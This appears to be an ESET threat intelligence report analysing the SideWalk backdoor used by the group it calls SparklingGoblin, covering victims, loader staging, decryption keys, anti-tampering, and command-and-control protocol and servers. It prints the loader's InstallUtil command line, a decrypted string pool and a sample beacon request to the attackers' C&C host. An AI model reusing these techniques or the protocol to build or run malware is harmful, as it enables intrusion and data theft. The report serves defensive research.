This\n[backdoor shares multiple similarities with another backdoor used by the group: CROSSWALK.](https://blogs.vmware.com/security/2019/09/cb-threat-analysis-unit-technical-analysis-of-crosswalk.html)\n\nSideWalk is a modular backdoor that can dynamically load additional modules sent from its C&C\nserver, makes use of Google Docs as a dead drop resolver, and uses Cloudflare workers as a C&C\nserver. It can also properly handle communication behind a proxy.\n\n## SparklingGoblin, a member of the Winnti family\n\nIn November 2019, we discovered a Winnti Group campaign targeting several Hong Kong universities;\n[it had started at the end of October 2019, and we published a blogpost about it. During that campaign](https://www.welivesecurity.com/2020/01/31/winnti-group-targeting-universities-hong-kong/)\n[the attackers mostly made use of the ShadowPad backdoor and](https://securelist.com/shadowpad-in-corporate-networks/81432/) [the Winnti malware, but also the](https://securelist.com/winnti-more-than-just-a-game/37029/)\n[Spyder backdoor and a backdoor based on DarkShell (an open source RAT) that we named](https://st.drweb.com/static/new-www/news/2021/march/BackDoor.Spyder.1_en.pdf)\nDoraemon.\n\n[Subsequent to that campaign, in May 2020 (as documented in our Q2 2020 Threat Report) we](https://www.welivesecurity.com/2020/07/29/eset-threat-report-q22020/)\nobserved a new campaign targeting one of the universities that was previously compromised by Winnti\nGroup in October 2019, where the attackers used the CROSSWALK backdoor and a PlugX variant\n\n\n-----\n\nusing Google Docs as a dead drop resolver. Even though that campaign exhibited links to Winnti\nGroup, the modus operandi was quite different, and we started tracking it as a separate threat actor.\n\nFollowing this (second) Hong Kong university compromise, we observed multiple compromises against\norganizations around the world using similar toolsets and TTPs. Considering those particular TTPs\nand to avoid adding to the general confusion around the “Winnti Group” label, we decided to document\nthis cluster of activity as a new group, which we have named SparklingGoblin, and that we believe is\nconnected to Winnti Group while exhibiting some differences.\n\n[Days before the intended publication of this blogpost, Trend Micro published a report about a group its](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/earth-baku-returns)\nresearchers track as Earth Baku and a campaign using malware they call the ScrambleCross\nbackdoor. These correspond to the group we track as SparklingGoblin and the SideWalk backdoor\ndocumented here.\n\n## Victimology\n\nSince mid 2020, according to our telemetry, SparklingGoblin has been very active and remains so in\n2021. Even though the group targets mostly East and Southeast Asia, we have seen SparklingGoblin\ntargeting a broad range of organizations and verticals around the world, with a particular focus on the\nacademic sector, but including:\n\nAcademic sectors in Macao, Hong Kong and Taiwan\nA religious organization in Taiwan\nA computer and electronics manufacturer in Taiwan\nGovernment organizations in Southeast Asia\nAn e-commerce platform in South Korea\nThe education sector in Canada\nMedia companies in India, Bahrain, and the USA\nA computer retail company based in the USA\nLocal government in the country of Georgia\nUnidentified organizations in South Korea and Singapore\n\n\n-----\n\n_Figure 1. Geographic distribution of SparklingGoblin targets_\n\n## SideWalk\n\nSideWalk staging is summarized in Figure 2. The SideWalk backdoor is ChaCha20-encrypted\nshellcode that is loaded from disk by SparklingGoblin’s InstallUtil-based .NET loaders.\n\n\n-----\n\n_Figure 2. SideWalk staging mechanism_\n\nAlso, as we will show below, the SideWalk backdoor shares multiple similiarities with CROSSWALK,\n[which is a modular backdoor attributed to APT41 by FireEye and](https://content.fireeye.com/apt-41/rpt-apt41/) publicly documented by Carbon\nBlack\n\n\n-----\n\n### First stage\n\nSideWalk’s shellcode is deployed encrypted on disk under the name Microsoft.WebService.targets and\n[loaded using SparklingGoblin’s InstallUtil-based .NET loader obfuscated with a modified ConfuserEx,](https://github.com/yck1509/ConfuserEx)\nan open source protector for .NET applications that is frequently used by the group.\n\nSparklingGoblin’s .NET loaders persist via a scheduled task using one of the following filenames:\n\nRasTaskStart\nRasTaskManager\nWebService\n\n[It executes the loader using the InstallUtil.exe utility using the following command:](https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool)\n\n1 C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=\n/LogToConsole=false /ParentProc=none /U\nC:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallWebService.sql\n\nwhere InstallWebService.sql is the malicious .NET loader. When started with the /U flag, as here, the\nUninstall method from the USCInstaller class in the UPrivate namespace method of the .NET loader is\ncalled (see Figure 3).\n\n_Figure 3. Hierarchy of an InstallUtil-based loader_\n\nA deobfuscated version of the RunShellcode method called by the Uninstall method is shown in Figure\n4.\n\n\n-----\n\n_Figure 4. .NET loader method called by the Uninstall method and that decrypts and injects the shellcode._\n\nAs we can see, the loader is responsible for reading the encrypted shellcode from disk, decrypting it\n[and injecting it into a legitimate process using the process hollowing technique. Note that the](https://attack.mitre.org/techniques/T1055/012/)\ndecryption algorithm used varies across samples.\n\nAdditionally, note that SparklingGoblin uses a variety of different shellcode loaders such as the Motnug\nloader and ChaCha20-based loaders. Motnug is a pretty simple shellcode loader that is frequently\nused to load the CROSSWALK backdoor, while the ChaCha20-based loaders, as their names\n[suggest, are used to decrypt and load shellcode encrypted with the ChaCha20 algorithm. The](https://en.wikipedia.org/wiki/Salsa20#ChaCha_variant)\nChaCha20 implementation used in this loader is the same one used in the SideWalk backdoor\ndescribed below. This implementation is counter based (CTR mode), using a 12-byte nonce and 32byte key with a counter value of 11, leading to the following initial state:\n\n**Offset** **0x00** **0x04** **0x08** **0x12**\n\n0x00 \"expa\" \"nd 3\" \"2-by\" \"te k\"\n\n0x16 Key Key Key Key\n\n0x32 Key Key Key Key\n\n0x48 0x0000000B Nonce Nonce Nonce\n\nThe 0x0000000B counter value differs from the usual ChaCha20 implementation, where it’s usually set\nto 0.\n\nNote that these ChaCha20-based loaders were previously documented in a blogpost from Positive\nTechnologies.\n\n### Initialization\n\nSimilar to CROSSWALK, the SideWalk shellcode uses a main structure to store strings, variables, the\nImport Address Table (IAT), and its configuration data. This structure is then passed as an argument to\nall functions that need it. During SideWalk’s initialization, first the strings are decrypted and added to\nthe structure, then the part of the structure responsible for storing the IAT is populated, and finally\nSideWalk’s configuration is decrypted.\n\n\n-----\n\n### Data and string pool decryption\n\nAt the very beginning of its execution, the data section at the end of the shellcode is decrypted using\nan XOR loop and this 16-byte key: B0 1D 1E 4B 68 76 FF 2E 49 16 EB 2B 74 4C BB 3A. This section,\nonce decrypted, contains the strings that will be used by SideWalk, including:\n\nregistry keys\ndecryption keys\npath to write files received from the C&C server\nHTTP method to be used\nHTTP request parameters\nURLs used to retrieve the local proxy configuration\ndelimiters used to retrieve the encrypted IP address from the Google Docs document\n\nThe decrypted string pool is listed in Figure 5 below.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n\nSOFTWARE\\Microsoft\\Cryptography\n\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\n\nProxyServer\n\nkT7fDpaQy9UhMz3\n\nZFYP0BV7SJ2LUH1Q9WEC8RTMXAKG6D3NO5I4LAHXN1EDRVC\n\nPBKW0X8MEOUSCA6LQJYH4R97VNI5T31FD2ZG697NYYGB81W\n\no71UwSfKrH0NkRhjOmXqFGMAWDplz4s\n\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\n\nKernel32.dll\n\nGetTickCount64\n\nGetTickCount\n\ntexplorer.exe\n\n%AllUsersProfile%\\UTXP\\nat\\\n\n%02X\n\nGET\n\nPOST\n\nMozilla/5.0 Chrome/72.0.3626.109 Safari/537.36\n\ngtsid:\n\ngtuvid:\n\nhttps://msdn.microsoft.com\n\nhttps://www.google.com\n\nhttps://www.twitter.com\n\nhttps://www.facebook.com\n\n0B93ACF2\n\nPublicKey:AE6849916EB80C28FE99FC0F3EFF\n\nCC1F99653E93305D\n\nhttpss\n\nGlobal\\JanzYQtWDWFejAFR\n\n\n-----\n\n_Figure 5. Decrypted configuration strings from SideWalk_\n\nNote that similar to SideWalk, CROSSWALK also starts its execution by decrypting a string pool using\nan XOR loop and a 16-byte key.\n\n**Instruction decryption**\n\nAfter decrypting the data section at the end of the shellcode, SideWalk then proceeds to decrypt the\nrest of its instructions (starting at offset 0x528) by using the same XOR loop with a different 16-byte\nkey: 26 74 94 78 36 60 C1 0C 41 56 0E 60 B1 54 D7 31.\n\n**Anti-tampering**\n\nOnce it has decrypted its data and code, SideWalk proceeds to verify its integrity by computing a 32bit checksum, rotating the result to the right by 13 bits at every 32-bit word and comparing the hash\nvalue with a reference one corresponding to the untampered shellcode. If the hash is different from the\nreference value, it exits. This allows the shellcode to detect breakpoints or patches to its code and to\navoid execution in such cases. The corresponding decompiled code is shown in Figure 6.\n\n_Figure 6. Decompiled code of SideWalk’s anti-tampering procedure_\n\n**IAT**\n\nIn addition to the string pool, the decoded data also contains the names of the DLLs, as well as the\nhashes of the names of the functions, to be loaded. Contrary to CROSSWALK, where the string\nrepresentation of the hashes is used, the hashes are stored directly in their raw binary representation.\nThe corresponding part of the main structure, after having resolved import addresses, is shown in\nFigure 7. The names of the DLLs to be loaded are highlighted in grey, the hash of the Windows API\nfunction names to be imported are in purple and the addresses of the imported functions are in green.\n\n\n-----\n\n_Figure 7. SideWalk’s IAT structure_\n\nSideWalk iterates over the exports of each of the DLLs listed in the decoded data and hashes them\nwith a custom hashing algorithm and then compares them to the hashes of the function names to be\nimported. Once a match is found, the address of the matching function is added to the main structure.\n\n**Configuration**\n\nOnce the IAT is populated, SideWalk proceeds to decrypt its configuration. The configuration is\nencrypted using the ChaCha20 algorithm and the decryption key is part of the string pool mentioned\nabove. The ChaCha20 implementation is the same one used for the ChaCha20-based loader. The\ndecrypted configuration contains values used by SideWalk for proper operation, as well as the\nupdate.facebookint.workers[.]dev C&C server, and the URL of the Google Docs document that is later\nused as a dead-drop resolver.\n\nNote that the update.facebookint.workers[.]dev domain is a _[Cloudflare worker that lets the malware](https://blog.cloudflare.com/announcing-workers-dev/)_\noperators customize the server, running on a widely used, public web service. During that campaign,\nSparklingGoblin also used a Cloudflare worker domain with Cobalt Strike:\ncdn.cloudfiare.workers[.]dev.\n\n### Network Activity\n\nOne feature of SideWalk is to check whether a proxy configuration is present before starting to\ncommunicate with the C&C server. To do so, it tries two techniques:\n\nA call to the API function WinHttpGetIEProxyConfigForCurrentUser, with predefined URLs\ncontained in its configuration:\nIf SideWalk is able to adjust its privileges to SeDebugPrivilege, it tries to retrieve the proxy\nconfiguration from HKU\\<user SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet\nSettings\\ProxyServer. Otherwise, it tries to fetch it from\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ProxyServer.\n\n\n-----\n\nIf a proxy is found, SideWalk will use it to communicate with the C&C server. This behavior is very\nsimilar to the way proxies are handled by CROSSWALK.\n\nSideWalk attempts to obtain the proxy configuration of the current user session by stealing the user\ntoken from explorer.exe (the process name to search for is in the configuration) and calling the\nWindows API WinHttpGetIEProxyConfigForCurrentUser.\n\nNote that SideWalk has the necessary permissions to impersonate logged-on users because it is\nloaded by the InstallUtil-based .NET loader, which persists as a scheduled task, and so runs under the\nSYSTEM account. Interestingly, the same procedure to get the explorer.exe token is described on this\n_[Chinese language blog. The decompiled procedure is shown in Figure 8.](https://www.cnblogs.com/priarieNew/p/9755655.html)_\n\n_Figure 8. Decompiled code responsible for user impersonation before retrieving the proxy configuration_\n\n\n-----\n\n**Requests formats**\n\nThe Google Docs page used by SideWalk as a dead-drop resolver is shown in the following\nscreenshot (Figure 9), and at the time of writing, it is still up. Note that anyone can edit this page.\n\n_Figure 9. Google Docs document used by SideWalk as dead-drop resolver_\n\nThe string present on this page has the format depicted in Figure 10.\n\n_Figure 10. Format of the string hosted on the Google Docs document_\n\nThis string is composed of:\n\nDelimiters used for proper parsing.\nA payload and its size, which consists of a ChaCha20-encrypted IP address, the key to decrypt\nit, and, for an integrity check, the hash of the decryption key.\nAdditional strings that are currently unused.\n\nTo facilitate the potential future usage of that formatting, we have provided a script in our GitHub\nrepository.\n\nThe decrypted IP address is 80.85.155[.]80. That C&C server uses a self-signed certificate for the\n[facebookint[.]com domain. This domain has been attributed to BARIUM by Microsoft, which partially](https://github.com/Azure/Azure-Sentinel/blob/master/Detections/MultipleDataSources/BariumDomainIOC112020.yaml)\noverlaps with what we define as Winnti Group. As this IP address is not the first one to be used by the\nmalware, it is considered to be the fallback one.\n\nThe communication protocol used by SideWalk to communicate with its C&C server is HTTPS and the\nformat of the POST request headers sent to the C&C can be seen in Figure 11.\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n\nPOST /M26RcKtVr5WniDVZ/5CDpKo5zmAYbTmFl HTTP/1.1\n\nCache-Control: no-cache\n\nConnection: close\n\nPragma: no-cache\n\nUser-Agent: Mozilla/5.0 Chrome/72.0.3626.109 Safari/537.36\n\ngtsid: zn3isN2C6bWsqYvO\n\ngtuvid: 7651E459979F931D39EDC12D68384C21249A8DE265F3A925F6E289A2467BC47D\n\nContent-Length: 120\n\nHost: update.facebookint.workers.dev\n\n\n_Figure 11. Example of a POST request used by SideWalk_\n\nBoth the URL and the values of the gtsid and gtuvid parameters are randomly generated. The Host\nfield is either the IP fetched from Google Docs, or is set to update.facebookint.workers[.]dev. The data\nof the POST request is an encrypted payload. The format used by this request is the communication\nformat used by SideWalk operators between C&C server and infected machines, e.g., requests and\nresponses. The format of the POST request data is shown in Figure 12.\n\n\n-----\n\n_Figure 12. Format of the POST request data_\n\nNote that this format is used for both the request and the response, meaning that when SideWalk\nhandles the data sent back from the C&C server, it parses it according to the same format. There is no\nparticular similarity in the C&C server communication side between CROSSWALK and SideWalk.\n\nIn this format, the fields are:\n\nhash: the hash of the data from 0x10 to total_size of the payload. The hash algorithm is a custom\nhash combined of multiple MD5 calls on different portions of the hashed data.\nsize: the size is equal to total_size – 0x0D.\nkey1, key2: ChaCha20 keys to encrypt Header Buffer and Data Buffer.\nparameter buffer: optional buffer (may be 0…0).\nvictim ID: authentication information, which is the result of a custom hash of various machine\ninformation including Machine GUID and computer name.\n\n\n-----\n\nexecution ID: before launching the threads, this ID is generated using CryptGenRandom. It is\ndifferent for each execution.\ncommand ID / response ID: ID of the action that has been handled by the malware when it is a\nrequest from the malware to the C&C server, and the ID of the command to execute when it is a\nresponse from the C&C server to the malware.\ncounter: number of commands executed since the current SideWalk process inception.\ndata: the ChaCha20-encrypted, compressed data fetched by the malware or sent by the C&C\nserver.\ncompressed size: the size of the LZ4-compressed data.\ndata size: the uncompressed data size.\n\nHeader Buffer and Data Buffer are encrypted using the corresponding keys. The first one stands for\nthe metadata to identify the machine that was compromised, and the second buffer corresponds to the\nactual data shared between the C&C server and the malware. The details of these fields shown in\nFigure 12, are visible once decrypted.\n\n**Capabilities**\n\nWhen we started analyzing SideWalk, as its C&C server was already down, some of the possible\nactions were not fully understandable without knowing the data sent by the C&C server, yet most of\nthe capabilities of the malware are documented in the following table.\n\n_Table 1. C&C commands supported by SideWalk_\n\n\n**Command**\n**ID (C&C to**\n**malware)**\n\n\n**Response**\n**ID**\n**(malware**\n**to C&C)** **Description**\n\n\n**0x00** None Do nothing.\n\n**0x7C** 0x79 Load the plug-in (as shellcode) sent by the C&C server.\n\n**0x82** 0x83 Collect information about running processes (owner SID, account\nname, process name, domain information).\n\n**0x8E** 0x8F Write the received data to the file located at\n%AllUsersProfile%\\UTXP\\nat\\<filename>, where filename is a hash of\nthe value returned by VirtualAlloc at each execution of the malware.\n\n**0x64** None Call one of the plug-ins received from the C&C server. Each command\ncalls them differently using different arguments. In addition, the\ncommand 0x74 terminates all the threads.\n\n**0x74** None\n\n**0x78** 0x79 or\n0x7B\n\n**0x7E** None\n\n**0x80** 0x81\n\n**default** None\n\n\n-----\n\nNote: As we didn t retrieve any plug-ins from the C&C server, it s difficult to assess SideWalk s full\ncapabilities.\n\n### The CROSSWALK connection\n\nEven though the SideWalk and CROSSWALK code is different, both families share multiple\narchitectural similarities, with a similar anti-tampering technique, threading model and data layout, and\nthe way this data is handled throughout execution. Feature-wise, both backdoors are modular and able\nto handle proxies to communicate properly with their C&C servers.\n\nThese similarities are described below and summarized in a table at the end of this section.\n\nConsidering all these similarities, we believe SideWalk and CROSSWALK are most likely coded by the\nsame developers.\n\n**Architecture**\n\nThe threading model is very similar between SideWalk and CROSSWALK. The authors split tasks\nbetween threads and use PostThreadMessage Windows API calls to communicate between them. For\nexample, one thread is responsible for making a request, and once it gets the response, it transfers it\nto the appropriate thread.\n\nThe programming style is also very similar; a functional approach is used. A data structure stores the\nconfiguration, strings, and imports, and it is passed as an argument to all the functions that need it.\n\nFor example, here are a few function prototypes:\n\n__int64 getMachineGuid(main_struct* main_struct, __int64 machineguid)\n__int64 writeBufferToFile(main_struct* main_struct, __int64 buffer, unsigned int nbBytes)\n__int64 recv(main_struct* main_struct, __int64 socket, unsigned int nbBytes, __int64 buffer)\n\nBoth SideWalk and CROSSWALK are modular backdoors that can load additional modules sent by the\nC&C server. The SideWalk module handling is implemented in a manner similar to CROSSWALK.\nSome of the possible module operations are execution, installation, and uninstallation.\n\n**Functionalities**\n\nLike CROSSWALK, during its initialization, SideWalk computes a 32-bit hash value of the shellcode at\nthe very beginning of its execution using a ROR4 loop.\n\nCROSSWALK and SideWalk gather similar artifacts; among them:\n\nIP configuration\nOS version\nUsername\nComputer name\nFilename\nCurrent process ID\nCurrent time\n\n\n-----\n\nProxy handling is the same in both CROSSWALK and SideWalk. Both use common, legitimate URLs\n(such as _[https://www.google.com or](https://www.google.com/)_ _[https://www.twitter.com) and a](https://www.twitter.com/)_\nWinHttpGetIEProxyConfigForCurrentUser Windows API call to retrieve the proxy configuration.\n\n**Data layout**\n\nSideWalk and CROSSWALK follow the same shellcode layout, with instructions followed by strings,\nIAT, and encrypted configuration data.\n\n**Data handling**\n\nSideWalk and CROSSWALK each process the data at the end of the shellcode in the same way:\n\nFirst, the data section is decrypted using a 16-byte XOR loop.\nThen, function addresses from name hashes stored in the data section are resolved and stored\nin its main structure (pointing to the IAT in the data section).\nFinally, its configuration that contains the C&C server address is decrypted (although the\ndecryption algorithm used by SideWalk is different).\n\n_Table 2.

It was\nmost likely produced by the same developers as those behind CROSSWALK, with which it shares\nmany design structures and implementation details.\n\nSparklingGoblin is a group with some level of connection to Winnti Group. It was very active in 2020\nand the first half of 2021, compromising multiple organizations over a wide range of verticals around\nthe world and with a particular focus on the academic sector and East Asia.\n\n_ESET Research is now offering a private APT intelligence report and data feed.
